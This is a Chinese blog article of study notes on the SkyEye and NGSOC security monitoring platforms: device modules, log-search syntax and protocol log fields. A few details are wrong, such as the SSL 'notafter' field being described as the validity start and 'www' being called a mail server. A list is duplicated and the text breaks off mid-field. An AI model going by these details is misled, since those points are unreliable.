{"title":"天眼&NGSOC告警分析","uid":"bc3ebb8ae7699a64039d8253e84d74dc","slug":"AA_天眼&NGSOC告警分析","date":"2023-08-25T12:30:34.000Z","updated":"2024-04-13T10:15:45.078Z","comments":true,"path":"api/articles/AA_天眼&NGSOC告警分析.json","keywords":null,"cover":"../picture/37.jpg","content":"<h1 id=\"天眼-amp-NGSOC告警分析\"><a href=\"#天眼-amp-NGSOC告警分析\" class=\"headerlink\" title=\"天眼&amp;NGSOC告警分析\"></a>天眼&amp;NGSOC告警分析</h1><h2 id=\"天眼使用指南\"><a href=\"#天眼使用指南\" class=\"headerlink\" title=\"天眼使用指南\"></a>天眼使用指南</h2><p>&lt; 分析平台，流量传感器，文件威胁鉴定器 &gt;</p>\n<p>新一代安全感知系统：检测，溯源，响应</p>\n<p><strong>云端威胁情报：</strong></p>\n<p>文件威胁鉴定器<br>静态检测，动态检测</p>\n<p>分析平台<br>威胁感知，调查分析，场景化分析</p>\n<p>流量传感器<br>入侵攻击检测，威胁情报匹配，文件还原，数据采集</p>\n<p>天擎<br>EDR联动，终端响应</p>\n<h3 id=\"天眼设备介绍-传感器\"><a href=\"#天眼设备介绍-传感器\" class=\"headerlink\" title=\"天眼设备介绍-传感器\"></a>天眼设备介绍-传感器</h3><p><em>【总览】</em></p>\n<p>流量采集 -&gt; 协议分析(DNS,FTP,HTTP,SSL,SMB,···) -&gt; 检测引擎 -&gt; 检测结果</p>\n<p><strong>检测引擎：</strong><br>· 基于双向会话分析的Web入侵检测<br>· 基于沙箱的webshell上传检测<br>· 基于规则的网络入侵检测，威胁情报检测，基于人工智能机器自学习的入侵检测nbt引擎</p>\n<p><strong>检测结果：</strong><br>· 产生准确的入侵告警<br>· 告警信息存入分析平台，作为攻击取证及快速溯源的数据支撑</p>\n<p><em>【界面信息】</em></p>\n<p><strong>仪表盘：</strong><br>—状态监听：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">包括设备连接状态、设备列表、资源占用、系统信息、授权信息、攻击规则信息、威胁情报信息、网络流量、应用流\n量、数据采集、会话监控、文件类型统计、日志外发统计。</code></pre>\n\n<p><strong>威胁告警：</strong><br>—告警列表：展示网页漏洞利用，webshell上传，网络攻击，威胁情报4种类型的所有告警。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在【威胁告警】---【详情】因为在告警详情中，对于url编码、base64编码、以及各种中文编码，浏览器不能提供直接的转义功能，导致\n部分告警分析存在困难，所以提供此小工具对各种编码内容进行转义。</code></pre>\n\n<p><strong>规则配置：</strong><br>—网页漏洞利用，<br>—webshell上传，<br>—网络攻击，<br>—自定义规则（漏洞规则，威胁情报）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;注&gt;：自定义威胁情报支持导入导出。\n导出格式：导出情报文件的格式，可选OPENIOC、JSON、STIX三种格式，支持多选，选择多种格式则以压缩包形式导出，解压后可查看\n文件；\n导出状态：选择需要导出情报的状态，“全部”、“全部启用”、“全部停用”只能选择一种，选择“全部”则导出所有情报，选择“全部启用”\n则导出启用状态为启用的所有情报，选择“全部停用”则导出启用状态为停用的所有情报。</code></pre>\n\n<p><strong>策略配置：</strong><br>—威胁检测：提供了检测开关的启停功能，及高级参数，弱口令，内部资产IP的配置功能。注：高级参数设定阈值后需要通过点击“保存”按钮使配置生效。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">策略配置---威胁检测---XFF\n因流量进过不同设备时，数据流中的IP可能会被替换。此功能是了为识别真正的源IP。\n\n策略配置---威胁检测---弱口令\n【弱口令规则】模块的正则表达式，支持用于检测http协议中的弱口令登录行为，对应的检测规则为“WEB弱口令登录”。用户可根据需要对\n正则表达式进行修改，以替换默认的正则表达式，配置完成需点击“保存”按钮使生效。同时，也支持点击“重置”按钮，将弱口令规则重置\n为系统默认的正则表达式。\n【弱口令字典】模块，用于在内置弱口令不能完全满足需求的情况下，补充自定义的弱口令，检测流量中存在使用口令字典中密码登录的情况。</code></pre>\n\n<p>—流量记录：页面提供三个功能，</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">启用流量负载记录，控制向分析平台发送数据中是否带payload数据及携带的上下行数据长度；\n启用流量过滤，提供网络流量筛选功能；\n自定义协议，支持用户根据端口配置协议信息。</code></pre>\n\n<p>—文件还原：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">用于配置管理文件还原功能，支持启停文件还原功能，并支持配置还原的协议类型、文件类型及文件大小（最大值）。支持在【系统管理\n---&gt;联动管理---&gt;数据传输设置】页面配置传输规则，将还原的文件外发给文件威胁鉴定器。</code></pre>\n\n<p>—抓包检测：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">【PCAP文件检测】提供对用户手动导入pcap文件进行检测的功能，系统会分析pcap文件中的协议，还原协议传输中的文件，检测是否存\n在网络攻击。系统会将分析出来的协议日志、告警日志发送分析平台，将产生的网页漏洞利用、webshell上传、网络攻击、威胁情报告\n警、恶意文件在威胁感知---&lt;告警列表页面进行展示，将还原出的文件和对应的流量日志发送文件威胁鉴定器。</code></pre>\n\n<p>—旁路阻断：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">通过分析设备采集的流量数据包，再根据配置的阻断策略通过发rst报文或重定向的形式对满足条件的流量进行封禁操作，并统计阻断次\n数、记录阻断日志。支持配置管理阻断策略及封禁策略（人工规则）、阻断白名单信息。</code></pre>\n<p>—ssl解密：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">【SSL解密】http流量经过SSL加密，就是https流量，而加密过程就是服务器使用SSL私钥进行加密。传感器在处理HTTPS流量时，首先\n会使用用户上传的私钥对相应的流量进行解密，将https流量转换为http流量，之后就是正常的流量处理流程（文件还原，告警等），同\n时向外发送日志。web界面上解密流量的私钥状态会变为绿色。</code></pre>\n\n<p>—白名单配置：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">系统提供两大类白名单配置，配置规则与威胁情报白名单之后，命中白名单的告警不会入数据库存储，也不会进行展示和外发；配置文\n件白名单，命中文件MD5后不会进行检测。点击白名单类型下拉列表可以切换不同的类型。</code></pre>\n\n<p><strong>系统管理：</strong><br>—基础配置：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">包括系统证书配置、网络配置、时间配置、升级配置、运营配置、存储管理、系统维护、诊断工具、系统信息配置，配置完成\n后点击“保存”即可生效。\n其中【升级配置】模块用于显示系统软件版本、引擎与规则库版本、威胁情报版本以及设置系统&#x2F;规则的升级方式、升级周期和相关\n升级配置。\n注：自动升级功能需要在系统能够访问天眼升级服务器的情况下使用，为了保证系统的及时更新，建\n议配置为自动升级。</code></pre>\n\n<p>—联动管理：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">【数据传输设置】模块用于配置分析平台、文件威胁鉴定器、SYSLOG服务器、Hadoop平台、攻击诱捕系统5种平台的传输规则配置，同时提供了\n日志外发白名单功能，匹配白名单的日志将不再传输给其他平台。\n【邮件配置】\n【SNMP管理】模块提供用户SNMP服务配置和SNMP Trap配置功能，用来对设备运行状态进行实时监测。管理员可通过SNMP客户端主动访问设备\nMIB库查询，也可通过配置SNMP Trap在客户端接收设备发出的Trap消息。\n【取证存储平台配置】</code></pre>\n<p>—安全性配置：包括登陆设置、数据传输加密、敏感操作密码、单点登录密钥配置。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">【登录设置】用来配置系统账号安全参数，提高账户安全性以及防破解能力\n【数据传输加密】提供与分析平台、Hadoop平台、文件威胁鉴定器联动时的数据加密功能及相关配置，可配置加密算法、加密密钥。\n注：对端的分析平台、Hadoop平台、文件威胁鉴定器需配置相同的加密算法、加密密钥，否则无法\n解密设备传送的数据。\n【敏感操作密码】模块可以查看密码的具体内容，并且提供于弱口令的明文展示，在弱口令展示的时候默认不明文展示，输入\n“验证敏感操作密码”可以查看明文弱口令。敏感操作密码的默认密码为随机生成，并且敏感操作密码可以进行修改，修改格\n式为：6---32位数字或字母或特殊字符。\n【单点登录密钥配置】模块提供分析平台单点登录到流量传感器时的登录密钥配置，涉及从分析平台单点登录流量传感器、\n联动处置查看&#x2F;下发&#x2F;删除流量传感器的阻断策略功能。流量传感器与分析平台【系统管理---&gt;设备管理---&gt;设备配置】页面该采\n集设备的“免密登录密钥”保持一致时，方可使用上述功能。</code></pre>\n<p>—账号管理：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">系统维护人员保证系统安全的一项措施，以控制系统维护人员对系统的使用、防止系统维护人员对系统的越权使用或误操作。</code></pre>\n<p>—审计管理</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">【操作审计】模块主要用于对用户操作信息进行查询和导出。管理员可按照开始时应用安全间、结束时间、用户、登录IP、功能、操作类型\n等信息进行条件查询。\n【系统日志】</code></pre>\n\n<h3 id=\"天眼设备介绍-天眼分析平台\"><a href=\"#天眼设备介绍-天眼分析平台\" class=\"headerlink\" title=\"天眼设备介绍-天眼分析平台\"></a>天眼设备介绍-天眼分析平台</h3><p><strong>监测中心：</strong><br>—仪表盘</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">仪表板默认统计了 8 个维度的数据，包括告警统计、攻击者统计、受害主机统计、系统维护、文件威胁\n鉴定器、邮件威胁检测系统、网神云锁和自定义视图。</code></pre>\n\n<p>—系统运行监控</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">全景图形式展现分析平台联动的设备信息。</code></pre>\n\n<p>—检测工作台</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">监测工作台支持用户自定义配置重点监测\n数据到工作台，方便用户统一查看并使用重点关\n注的系统功能模块信息。包含：重点监测：失陷\n主机、外部攻击、横向攻击、越权访 问、弱口\n令、挖矿行为、暴力破解、补天漏洞。威胁感知：\n告警列表，威胁情报，web 安 全，数据库安全，\n中间件安全，未授权行为，设备安全，攻击者视\n角和资产视角。分析中 心：DNS 服务分析，非\n常规服务分析，邮件行为分析，登录分析，web \n服务器行为分析， 数据库行为分析，访问行为\n分析。资产感知：资产管理，资产发现，资产互\n访，脆弱性， 配置核查。系统配置：证书配置，\n设备监控。</code></pre>\n\n<p>—态势感知</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">注 1：大屏支持分辨率 2k（1920*1080）、4k（3840*2160），其他分辨率的屏幕可 能会引起显示异常\n注 2：访问大屏需使用谷歌 67.0.3396.99 及以上版本，低版本谷歌浏览器访问大屏可 能会引起显示异常</code></pre>\n\n<p>—态势感知高级版</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">天眼威胁感知大屏持续监控攻击，且直观的展现攻击的总体状况，支持中国地图高交互下钻，安装胶囊\n客户端即可体验。主要由网络风险指数、告警总数、攻击概要、告警类型 TOP5、告警变化趋势、攻击者 \nTOP5、受害资产 TOP5 和实时告警组成。</code></pre>\n\n<p><strong>威胁感知：</strong><br>—告警列表<br>流量传感器<br>文件威胁鉴定器<br>邮件威胁检测系统<br>攻击诱捕系统<br>智慧管理分析系统（SMAC）<br>服务器安全管理系统（云锁）<br>SOAR自动化编排场景<br>全部<br>—威胁视角<br>威胁情报<br>应用安全<br>—攻击者视角<br>—资产视角</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">自定义检索场景支持置顶、重命名、删除检索场景、保存+另存为检索场景</code></pre>\n\n<p><strong>分析中心：</strong><br>—日志检索</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">日志检索支持快捷模式、高级模式、专家模式。</code></pre>\n\n<p>—行为分析<br>DNS服务分析<br>非常规服务分析<br>邮件行为分析<br>登陆行为分析<br>web服务器行为分析<br>数据库行为分析<br>访问行为分析<br>黑IP行为分析<br>旁路阻断行为分析</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">行为分析包括 DNS 服务分析、非常规服务分析、邮件行为分析、登录行为分析、 WEB 服务器行为分析、\n数据库行为分析和访问行为分析七大模块，每个部分包含对应的分析场景，基本涵盖行为分析的业务场景。\n行为分析覆盖场景丰富，根据多种威胁类型全面检测用户环境的异常行为。其中 DNS 服务分析包含了\n子场景可疑 DNS 解析、 DNS 服务器发现、链路劫持分析、DNS 重绑定分析；非常规服务分析包含了子\n场景可疑代理、远程工具、反弹 shell；登录行为分析包含了子场景暴力破解、异常登录、特权账号登录\n、弱口令、明文密码泄露；WEB 服务行为分析包括非常用请求方法发现、 可疑爬虫或扫描、后门上传利\n用；访问行为分析包括外部访问、横向访问、内部主机外联、风险端口访问。</code></pre>\n\n<p>—全包取证分析<br>—天眼狩猎</p>\n<p><strong>响应处置：</strong><br>—处置编译<br>工作流程<br>联动服务<br>任务脚本<br>帮助文档<br>—策略管理<br>策略定义<br>策略联动<br>—处置记录<br>—联动记录</p>\n<p><strong>资产感知</strong>：<br>—资产<br>资产管理<br>资产发现<br>资产互访<br>IP地址管理<br>—脆弱性<br>—配置核查<br>—补天漏洞</p>\n<p><strong>报表报告：</strong><br>—快速报表<br>—周期报表<br>—报表模板</p>\n<p><strong>重保：</strong><br>—重保模式</p>\n<pre class=\"line-numbers language-txt\" data-language=\"txt\"><code class=\"language-txt\">重保演习主要为了护网事件所设定，用户可以自定义护网任务，根据用户所选择的资产组进 行重点关注。\n护网任务一共包含三个阶段：备战阶段、实战阶段、战后任务列表。\n【自定义黑 IP】可通过本地录入和离线导入两种方式导入黑 IP。其中本地录入支持手动添加黑 IP 和\n从本地批量上传黑 IP 两种方式。\n离线导入 方式数据导出和离线导入两种操作。若未安装或激活黑 IP 插件，点击【导出统计数据】按钮，\n则会跳转至扩展程序配置页面；若已安装并激活黑 IP 插件，点击【导出统计数据】按钮，则跳转至 \n【扩展程序】-&gt;【告警分析】页面</code></pre>\n\n<p>—倒计时配置</p>\n<p><strong>更多：</strong><br>—安全服务<br>服务记录<br>安全工具</p>\n<p>—扩展程序</p>\n<p>—第三方日志</p>\n<p><strong>系统管理：</strong><br>—基础配置</p>\n<pre class=\"line-numbers language-txt\" data-language=\"txt\"><code class=\"language-txt\">【系统升级】提供了在线升级和离线升级系统软件版本、规则库版本和补天漏洞情报版本。\n注 1：在线升级时，规则库版本自动后台升级，每小时的 15 分请求一次云端，如果规则有更新\n则自动进行升级。离线升级时，规则库版本同样使用“离线升级”入口进行手动升级。</code></pre>\n\n<p>—联动管理<br>—审计管理<br>—规则管理<br>—设备管理</p>\n<h3 id=\"天眼设备介绍-文件鉴定器\"><a href=\"#天眼设备介绍-文件鉴定器\" class=\"headerlink\" title=\"天眼设备介绍-文件鉴定器\"></a>天眼设备介绍-文件鉴定器</h3><p><strong>检测能力</strong></p>\n<ul>\n<li>云查杀引擎</li>\n<li>数字签名检测</li>\n<li>QEX脚本查杀引擎</li>\n<li>启发式引擎</li>\n<li>QVM人工智能引擎</li>\n<li>系统文件智能修复引擎</li>\n<li>安卓文件检测引擎</li>\n<li>BitDefender检测引擎<br>检测能力</li>\n<li>云查杀引擎</li>\n<li>数字签名检测</li>\n<li>QEX脚本查杀引擎</li>\n<li>启发式引擎</li>\n<li>QVM人工智能引擎</li>\n<li>系统文件智能修复引擎</li>\n<li>安卓文件检测引擎</li>\n<li>BitDefender检测引擎</li>\n<li>模拟文件真实运行</li>\n<li>分析文件行为</li>\n</ul>\n<p><strong>天眼文件威胁鉴定器</strong></p>\n<ul>\n<li>沙箱：<br>支持4套环境（包括WIN XP,WIN7;搭载Office 03&#x2F;07等环境）</li>\n<li>行为：<br>主机行为：文件、注册表、进程、互斥体、服务等<br>网络行为：外链域名、外链主机等</li>\n<li>异常<br>异常检测：异常开启、异常关闭、检测沙箱环境等相关行为</li>\n<li>策略<br>针对大数据引擎及沙箱评估进行综合打分<br>策略设定；并在此基础上设置处置策略<br>支持威胁情报匹配</li>\n<li>文件<br>多文件来源：<br> ? 流量还原<br> ? 目录服务器（FTP&amp;SMB）<br> ? 手动提交<br> ? API接口</li>\n<li>环境<br>灵活的流程控制，可基于策略进行样本归档、静态-动态检测流程自定</li>\n</ul>\n<h2 id=\"天眼日志检索语法-重点1\"><a href=\"#天眼日志检索语法-重点1\" class=\"headerlink\" title=\"天眼日志检索语法(重点1)\"></a>天眼日志检索语法(重点1)</h2><p><strong>布尔运算符（AND、OR、NOT）</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">日志检索系统支持 AND OR NOT 三种运算符（运算符要大写）。\nAND 运算符（ AND 、 &amp;&amp; 或 + ）\nAND 运算符关联两部分内容，代表两部门内容必须同时存在。\n示例： dip:10.16.16.46 AND client_os:&quot;Windows7 or 8&quot;\nOR 运算符（ OR 或 || ）\nOR 运算符关联两个项或短语，任意一个匹配即满足。\n示例： dport:&quot;443&quot; OR dport:&quot;8080&quot;\nNOT 运算符（ NOT 、! 或 - ）\nNOT 运算符排除含有NOT 运算符后面的项或短语的记录。相当于非运算符。\n示例： dport:&quot;80&quot; NOT host:&quot;www.example.com&quot;</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">搜索语句一般由 “字段名称”、“项”、以及 “运算符”三大\n元素组成。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">短语搜索运算符&quot; &quot;\n短语运算符将短语括在引号 &quot; &quot; 中。 例如，Roach Motel（没有引号）会以任何顺序\n在任何位置搜索包含 Roach 和&#x2F;或 Motel 的文档，而 &quot;Roach Motel&quot;（带引号）只\n会匹配包含整个短语并按该顺序排列的文档（文本分析仍然适用）。</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">优先运算符（）\n优先运算符将字符串括在括号 ( ) 中。 例如，motel+(wifi | luxur y) 将搜索包含\nmotel 词条以及 wifi 或 luxur y（或两者）的文档。\n分组\n(jakarta OR apache) AND jakarta\n字段分组\ntitle:(+return +&quot;pink panther&quot;)\nhost:(baidu OR qq OR google) AND host:(com OR cn)</code></pre>\n\n<p><strong>日志检索高级查询语法</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">通配符查询\n支持在一个项内的单个和多个字符的通配符搜索。使用问号（? ）表\n示单个字符的通配符搜索，使用星号（ * ）表示多个字符的通配符搜索。\n多字符的通配符搜索寻找零个或多个字符。\n示例 ：搜索单词m s sql或m y sql可以使用 db_type:m?sql (不加引号)\n范围查询\n查询所指定的上限和下限之间的字段值的记录匹配。可用于数值 &#x2F;\n时间&#x2F; IP 类型的字段。包含上下限范围的查询通过方括号和运算符TO\n来表示。\n示例 ：搜索IP范围 [&quot;192.168.0.0&quot; TO &quot;192.168.255.255&quot;]</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">注：搜索的关键字尽量不要包含特殊符号+ -&amp;&amp; ||! ( ) &#123; &#125; [ ] ^ &quot; ~ *? : \\以上特殊字符如果包含在搜\n索的关键字内，需要使用“\\”转义。</code></pre>\n\n<h3 id=\"协议字段介绍\"><a href=\"#协议字段介绍\" class=\"headerlink\" title=\"协议字段介绍\"></a>协议字段介绍</h3><p><strong>威胁告警检索字段</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">\nattack_sip 攻击者 IP\nalarm_sip 受害者 IP\nattack_type 攻击类型</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">is_web_attack 用于标记告警是否是 web 告警</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">0: 否\n1: 是\nhazard_level 威胁级别 威胁级别标识、取值： 0 - 10</code></pre>\n\n<h3 id=\"网络协议公共字段\"><a href=\"#网络协议公共字段\" class=\"headerlink\" title=\"网络协议公共字段\"></a>网络协议公共字段</h3><p><strong>网络协议字段</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">access_time 日志生成时间</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">传感器采集到该数据包并解析完成生\n成日志的时间戳\n@timestamp 时间戳 日志在分析平台存储入库时添加\nsip 源 ip 网络数据流的发起 IP\nsport 源端口 网络数据流的客户端应用端口\ndip 目的 ip 网络数据流的服务端 IP\ndport 目的端口 网络数据流的服务端应用端口\ngeo ip 对应的地理位置</code></pre>\n\n<h3 id=\"TCP协议-amp-UDP\"><a href=\"#TCP协议-amp-UDP\" class=\"headerlink\" title=\"TCP协议&amp;UDP\"></a>TCP协议&amp;UDP</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">\nproto 协议 IP包头中的协议字段值</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">uplink_length 上行字节数</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">从TCP流的建立到该流的结束，从客户端发往服务器端的\n应用层数据的字节总数</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">downlink_length 下行字节数</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">从TCP流的建立到该流的结束，从服务器端发往客户端的\n应用层数据的字节总数\nsrc_mac 源mac TCP 数据流客户端发往服务端的数据包，源MAC地址\ndst_mac 目的mac TCP 数据流客户端发往服务端的数据包，目的MAC地址</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">up_payload 上行前 100 字节</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">从TCP流的建立起，从客户端发往服务器端应用层的前 100\n个字节</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">down_payload 下行前 100 字节</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">从TCP流的建立起，从服务器端发往客户端应用层的前 100\n个字节</code></pre>\n\n<h3 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h3><p><strong>HTTP请求方式</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1 GET 请求指定的页面信息，并返回实体主体。\n2 HEAD 类似于GET 请求，只不过返回的响应中没有具体的内容，用于获取报头\n3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包\n含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。\n4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。\n5 DELETE 请求服务器删除指定的页面。\n6 CONNECT HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。\n7 OPTIONS 允许客户端查看服务器的性能。\n8 TRACE 回显服务器收到的请求，主要用于测试或诊断。\n9 PATCH 是对PUT 方法的补充，用来对已知资源进行局部更新。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">根据HTTP 标准，HTTP 请求可以使用多种请求方法。\nHTTP1.0 定义了三种请求方法：GET, POST 和HEAD方法。\nHTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和CONNECT 方法。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">HTTP包头的method字段\n最常见：GET和POST\nuri 请求的资源 HTTP包头的URI字段\nhost 请求的域名 HTTP包头的host字段\ncookie Cookie HTTP包头的cookie字段\nagent 请求者信息 HTTP包头的user-Agent字段\nreferer 链接来源 HTTP包头的referer字段\nxff 请求端真实IP和代理 HTTP包头的xff字段（仅供参考）</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">POST类型的报文，截取POST的部分原始\n数据，最多 1000 字节</code></pre>\n\n<p><strong>HTTP状态码</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">状态码 状态码英文名称 中文描述\n100 Continue 继续。客户端应继续其请求\n200 OK 请求成功。一般用于GET与POST请求\n302 Found 临时移动。与 301 类似。但资源只是临时被移动。客户端应继续使用原有URI\n400 Bad Request 客户端请求的语法错误，服务器无法理解\n401 Unauthorized 请求要求用户的身份认证\n402 Payment Required 保留，将来使用\n403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求\n404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人\n员可设置&quot;您所请求的资源无法找到&quot;的个性页面\n405 Method Not Allowed 客户端请求中的方法被禁止\n500 Internal Server Error 服务器内部错误，无法完成请求\n502 Bad Gateway 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一\n个无效的响应</code></pre>\n\n<p><strong>HTTP X-Forwarded-For</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">X-Forwarded-For(XFF)是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的\n客户端最原始的IP地址的HTTP请求头字段。</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">每经过一个代理设备，设备可添加一个proxyN，这个字段是否可信取决于上一跳设\n备是否可信。\nX-Forwarded-For: client1, proxy1, proxy2, proxy3</code></pre>\n\n<p><strong>HTTP referer</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般\n会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得\n一些信息用于处理。</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Referer字段是分析漏洞利用行为时的重要参考字段，进行辅助溯源，判断告警\n触发方式。</code></pre>\n\n<h3 id=\"DNS协议\"><a href=\"#DNS协议\" class=\"headerlink\" title=\"DNS协议\"></a>DNS协议</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;www.163.com&#x2F;index.html\n1)http:&#x2F;&#x2F;:这个是协议，也就是HTTP超文本传输协议，也就是网页在网上传输的协议。\n2 ）www：这个是服务器名，代表着是一个邮箱服务器，所以是mail.\n3)163.com:这个是域名，是用来定位网站的独一无二的名字。\n4) http:&#x2F;&#x2F;www.163.com：这个是网站名，由服务器名+域名组成。\n5 ）&#x2F;：这个是根目录，也就是说，通过网站名找到服务器，然后在服务器存放网页的根目录\n6:）index.html：这个是根目录下的默认网页（当然， 163 的默认网页是不是这个我不知道，\n只是大部分的默认网页，都是index.html）\n7 ）http:&#x2F;&#x2F;www.163.com&#x2F;index.html:这个叫做URL，统一资源定位符，全球性地址，用于\n定位网上的资源。</code></pre>\n<p><strong>域名</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">国家顶级域名 ：中国:cn，美国:us，英国uk...\n通用顶级域名 ：com 公司企业 edu教育机构gov政府部门 int国际组织 mil军事部门 net网络 org非盈利组织</code></pre>\n\n<p><strong>DNS</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dns_type DNS访问类型\n表示是请求报文还是响应报文； 0 代表DNS请求； 1 代表\nDNS响应\nhost Host 请求的域名信息</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">addr 地址资源\nDNS的A记录，表示该host对应的IP地址信息；可能有多个\n记录\nmx 邮件交换记录 DNS的MX记录</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cname 域名的规范名称 DNS的CNAME记录，表示该host域名的其他别名记录</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">reply_code DNS响应结果状态 DNS响应报文中Flags字段中的Reply code信息</code></pre>\n\n\n<h3 id=\"SSL协议\"><a href=\"#SSL协议\" class=\"headerlink\" title=\"SSL协议\"></a>SSL协议</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">\nversion 版本号 SSL的版本号</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">session_id 会话id\n本次会话的session_id, server hello 报文中的\nsession_id\nserver_name 服务器名字\nSSL client_hello报文中的扩展字段通过该字段判\n断客户端和哪个站点进行交互。\nissuer_name 每封证书中的颁发者的名字 每封证书中的颁发者的名字\nnotbefore 该证书的有效期的起始时间 该证书的有效期的起始时间\nnotafter 该证书的有效期的起始时间 该证书的有效期的起始时间\npublic_key 该证书的公钥 该证书的公钥\nuser_name Sever端的证书的持有者\n最上层证书的使用者，即本次SSL连接Sever端的\n证书的持有者</code></pre>\n\n<h3 id=\"文件传输\"><a href=\"#文件传输\" class=\"headerlink\" title=\"文件传输\"></a>文件传输</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">\nproto 协议 协议名称；FTP&#x2F;SMB&#x2F;HTTP\ntrans_mode 传输模式 文件的传输模式；对于源ip来说，upload表示上传，\ndownload表示下载\nfile_name 文件名字 无\nfile_md5 文件md5 对于文件内容计算MD5\nmime_type 文件类型 文件类型\nuri 传输的资源及路径 HTTP包头的uri字段\nhost 域名 HTTP包头的host字段\nreferer 链接来源 HTTP包头的referer字段\nstatus 状态码 承载该文件的HTTP响应报文的返回码\nfile_dir 标示文件方向 文件的传输方向； 0 代表服务端传往客户端， 1 代表客户端\n传往服务端\nmethod 方法 HTTP包头的Method字段\nmime_type 文件类型 文件类型</code></pre>\n\n<h3 id=\"登陆协议\"><a href=\"#登陆协议\" class=\"headerlink\" title=\"登陆协议\"></a>登陆协议</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">proto 应用的协议\n登录行为数据流属于的应用协议；ftp, smb, oracle, mysql,\nmssql, postgresql, ssh, pop3, smtp\npasswd 登陆密码 登录使用的密码</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">info 登陆结果\n登录操作的结果：成功或者失败，FTP协议会记录具体\n信息\nuser 用户名 登录使用的用户名</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">db_type 数据库类型 当登录的是数据库时，该字段会有数值，表示数据库具\n体类型；mssql，oracle，MySQL，postgresql四种\nnormal_ret 登录或数据库操作结果的\n归一化展示 success，failed</code></pre>\n\n<h3 id=\"邮件协议\"><a href=\"#邮件协议\" class=\"headerlink\" title=\"邮件协议\"></a>邮件协议</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">proto 应用协议\n邮件使用的应用协议; pop3, smtp, imap,\nwebmail\ntime 邮件发送&#x2F;接收时间 